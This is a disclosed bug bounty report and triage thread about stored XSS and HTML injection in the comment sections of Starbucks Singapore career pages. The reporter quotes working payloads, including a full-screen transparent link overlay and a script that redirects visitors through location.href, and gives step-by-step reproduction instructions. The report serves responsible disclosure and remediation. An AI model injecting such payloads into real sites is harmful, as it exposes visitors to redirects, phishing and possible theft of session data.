title: Stored XSS on www.starbucks.com.sg/careers/career-center/career-landing-*

profile.name: Starbucks
profile.about: Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.

vulnerability_information: **Summary:** While enumeration of the webpage for Starbucks I observed the following pages. https://www.starbucks.com.sg/careers/career-center/career-landing-5? The webpage have been highly spam by automated scanners or malicious attack. By clicking on any of the pages it would redirect the user to a wordpress website ``` Obat Kebas ``` The owner of the following wordpress pages could manipulate user into redirecting to a Starbucks page for a job offer and an user by clicking on the webpage would redirect to a website of its choosing. {F439338} {F439340} * List any recommendations for bug fix Remove the pages from Starbucks webpage. ## Impact The owner of the following wordpress pages could manipulate user into redirecting to a Starbucks page for a job offer and an user by clicking on the webpage would redirect to a website of its choosing.
vulnerability_information_html:
Summary:
While enumeration of the webpage for Starbucks I observed the following pages.

https://www.starbucks.com.sg/careers/career-center/career-landing-5?

The webpage have been highly spam by automated scanners or malicious attack.
By clicking on any of the pages it would redirect the user to a wordpress website

<a href="https://obatkebaskesemutan.wordpress.com/" rel="dofollow noopener" style="z-index:9999999999999999;oncontextmenu:return false;onkeydown:return false;onmousedown:return false;position:fixed;top:0px !important;left:0px;width:100%;height:100%;color:transparent !important;display:block;text-align:center;font-size:0px;background-color:transparent;background-position:center;background-repeat:no-repeat;background-size:cover;" target="_blank" title="Obat Herbal">Obat Kebas</a>

The owner of the following wordpress pages could manipulate user into redirecting to a Starbucks page for a job offer and an user by clicking on the webpage would redirect to a website of its choosing.


  • List any recommendations for bug fix Remove the pages from Starbucks webpage.

Impact

The owner of the following wordpress pages could manipulate user into redirecting to a Starbucks page for a job offer and an user by clicking on the webpage would redirect to a website of its choosing.

activities.message: Website been spam with over 1.5k messages with HTML injection
activities.markdown_message: Website been spam with over 1.5k messages with HTML injection

activities.message: Clicking on any part of the webpage will redirect.
activities.markdown_message: Clicking on any part of the webpage will redirect.

activities.message:
Manage to get XSS working. https://www.starbucks.com.sg/careers/career-center/career-landing-1 I noted that https://www.starbucks.com.sg/careers/career-center/career-landing-2 has already been compromised by stored XSS and I use the same code and modify it for the XSS for landing page 1. POC: ```

Bus Charter Italy


Quality BusService Rome
Quality BusService Verona
Quality BusService Venice
Quality BusService Turin
Quality BusService Pisa
Quality BusService Naples
Quality BusService Palermo

``` The application page is now redirected to hackerone page. I am stopping my test now.
activities.markdown_message:
Manage to get XSS working.
https://www.starbucks.com.sg/careers/career-center/career-landing-1

I noted that https://www.starbucks.com.sg/careers/career-center/career-landing-2 has already been compromised by stored XSS and I use the same code and modify it for the XSS for landing page 1.

POC:

<div style="position:fixed;bottom:0;left:0;color:#000000;background:#dddddd;padding:1em;z-index:1000000000000000;"><h2><a href="https://www.coach-charter-italy.com/">Bus Charter Italy</a><br /></h2><img alt="bus charter italy" src="https://www.coach-charter-italy.com/_bilder/g_bilder/bilder/amalfi2.jpg" style="max-width:600px;" title="bus charter italy - bus company italy" /><br /><strong><a href="https://www.coach-charter-italy.com/Irro_Bus_Hire_Rome.html">Quality BusService Rome</a></strong><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Verona.html">Quality BusService Verona</a><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Venice.html">Quality BusService Venice</a><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Turin.html">Quality BusService Turin</a><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Pisa.html">Quality BusService Pisa</a><br /><strong><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Naples.html">Quality BusService Naples</a></strong><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Palermo.html">Quality BusService Palermo</a><br /><strong><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Services_for_Italy.html"></a></strong><br /></div><style>p{ display:none !important; } </style>
<script> location.href="https://hackerone.com"; </script></div>

The application page is now redirected to hackerone page. I am stopping my test now.

Can you add https://hackerone.com/0xc0ffee @0xc0ffee as a collaborator.
@tuxedo


Thanks

activities.message: Hi @13ern - Thank you for providing the additional information and nice job escalating this bug. I've invited @0xc0ffee to join as a collaborator. Can you also please include clear step-by-step instructions demonstrating how to reproduce this stored XSS?
activities.markdown_message: Hi @13ern - Thank you for providing the additional information and nice job escalating this bug. I've invited @0xc0ffee to join as a collaborator. Can you also please include clear step-by-step instructions demonstrating how to reproduce this stored XSS?

activities.message:
Hi @tuxedo, thanks for the compliment. Steps to reproduce for Stored XSS: 1. Browse to https://www.starbucks.com.sg/careers/career-center/career-landing-1 2. Click on "Leave a Comment" button 3. Enter the following for the comments field Actual code being used: ```

Bus Charter Italy


Quality BusService Rome
Quality BusService Verona
Quality BusService Venice
Quality BusService Turin
Quality BusService Pisa
Quality BusService Naples
Quality BusService Palermo

``` Modified code for clarity: ```

hackerone

``` The content for the above could be anything. I have modified the payload that someone has used on https://www.starbucks.com.sg/careers/career-center/career-landing-2 4. Enter a dummy value for Name field： Eg. Test 5. Enter a dummy email for Email field： Eg. test@live.com 6. Click on F5 for the page to reload Observe that the page now redirects user who clicks on the link to hackerone webpage. The following video shows that the XSS triggers when a user visits the page and is redirected to Hackerone homepage due to location.href that points to https://hackerone.com {F440057} Affected Webpages: + https://www.starbucks.com.sg/careers/career-center/career-landing-1 + https://www.starbucks.com.sg/careers/career-center/career-landing-2 + https://www.starbucks.com.sg/careers/career-center/career-landing-3 + https://www.starbucks.com.sg/careers/career-center/career-landing-4 + https://www.starbucks.com.sg/careers/career-center/career-landing-5 + https://www.starbucks.com.sg/careers/career-center/career-landing-6 Impact: Anyone who browses the webpage would be point to the attacker webpage of his choosing by HREF or cookie stealing.
activities.markdown_message:
Hi @tuxedo, thanks for the compliment.

Steps to reproduce for Stored XSS:

  1. Browse to https://www.starbucks.com.sg/careers/career-center/career-landing-1
  2. Click on "Leave a Comment" button
  3. Enter the following for the comments field

Actual code being used:

<div style="position:fixed;bottom:0;left:0;color:#000000;background:#dddddd;padding:1em;z-index:1000000000000000;"><h2><a href="https://www.coach-charter-italy.com/">Bus Charter Italy</a><br /></h2><img alt="bus charter italy" src="https://www.coach-charter-italy.com/_bilder/g_bilder/bilder/amalfi2.jpg" style="max-width:600px;" title="bus charter italy - bus company italy" /><br /><strong><a href="https://www.coach-charter-italy.com/Irro_Bus_Hire_Rome.html">Quality BusService Rome</a></strong><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Verona.html">Quality BusService Verona</a><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Venice.html">Quality BusService Venice</a><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Turin.html">Quality BusService Turin</a><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Pisa.html">Quality BusService Pisa</a><br /><strong><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Naples.html">Quality BusService Naples</a></strong><br /><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Palermo.html">Quality BusService Palermo</a><br /><strong><a href="https://www.coach-charter-italy.com/Irro_Bus_Charter_Services_for_Italy.html"></a></strong><br /></div><style>p{ display:none !important; } </style><script> location.href="https://hackerone.com"; </script></div>

Modified code for clarity:

<div style="position:fixed;bottom:0;left:0;color:#000000;background:#dddddd;padding:1em;z-index:1000000000000000;"><h2><strong><a href="https://www.hackerone.com">hackerone</a></a></strong><br /></div><style>p{ display:none !important; } </style><script> location.href="https://hackerone.com"; </script></div>

The content for the above could be anything. I have modified the payload that someone has used on
https://www.starbucks.com.sg/careers/career-center/career-landing-2

  1. Enter a dummy value for Name field：

    Eg. Test

  2. Enter a dummy email for Email field：

    Eg. test@live.com

  3. Click on F5 for the page to reload

    Observe that the page now redirects user who clicks on the link to hackerone webpage.

The following video shows that the XSS triggers when a user visits the page and is redirected to Hackerone homepage due to location.href that points to https://hackerone.com

Affected Webpages:

  • https://www.starbucks.com.sg/careers/career-center/career-landing-1
  • https://www.starbucks.com.sg/careers/career-center/career-landing-2
  • https://www.starbucks.com.sg/careers/career-center/career-landing-3
  • https://www.starbucks.com.sg/careers/career-center/career-landing-4
  • https://www.starbucks.com.sg/careers/career-center/career-landing-5
  • https://www.starbucks.com.sg/careers/career-center/career-landing-6

Impact:
Anyone who browses the webpage would be point to the attacker webpage of his choosing by HREF or cookie stealing.

additional_data.old_title: https://www.starbucks.com.sg/careers/career-center/career-landing-5? - URL redirection by comments ( Been compromised )

activities.message: Thank you @13ern! I was able to validate your report and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and if/when a fix will be implemented. Please note that the status and severity are subject to change.

activities.message:
Did a CVSS calculation
Would like to point out that the page itself is a Career portal page. Hence with a stored XSS it is more susceptible to conduct a phishing attack by redirecting user to a fake Starbucks recruitment page for malicious attack or collecting of PII information.
CVSS: 8.2 High 
https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H

activities.message:
Hi @13ern,

Thank you for your patience on this one! We apologize for the delay in getting this to a triaged state. I have confirmed the issue and forwarded the details along to our partners in Singapore for resolution. We'll provide an update as soon as we have more information on the status of a fix.

Thanks!
@shadegrown
activities.markdown_message:
Hi @13ern,

Thank you for your patience on this one! We apologize for the delay in getting this to a triaged state. I have confirmed the issue and forwarded the details along to our partners in Singapore for resolution. We'll provide an update as soon as we have more information on the status of a fix.

Thanks!
@shadegrown

activities.message: Thanks for the update @shadegrown
activities.markdown_message: Thanks for the update @shadegrown

Since I agree with @tuxedo's original CVSS calculation, I think it makes sense to award this near the high end of our "medium" range. We also appreciate being made aware of the fact that the vulnerability is already being leveraged for spam and malicious redirects to untrusted domains, so I'm awarding a bonus as well.

Thanks!
@shadegrown

activities.message:
Hi @13ern,

I just got notification from the team working on this that the issue has been resolved. I retested and confirmed that the vulnerable pages have been taken down and are no longer publicly accessible. Thank you again for the report. We look forward to seeing more submissions from you in the future!

Thanks,
@shadegrown
activities.markdown_message:
Hi @13ern,

I just got notification from the team working on this that the issue has been resolved. I retested and confirmed that the vulnerable pages have been taken down and are no longer publicly accessible. Thank you again for the report. We look forward to seeing more submissions from you in the future!

Thanks,
@shadegrown
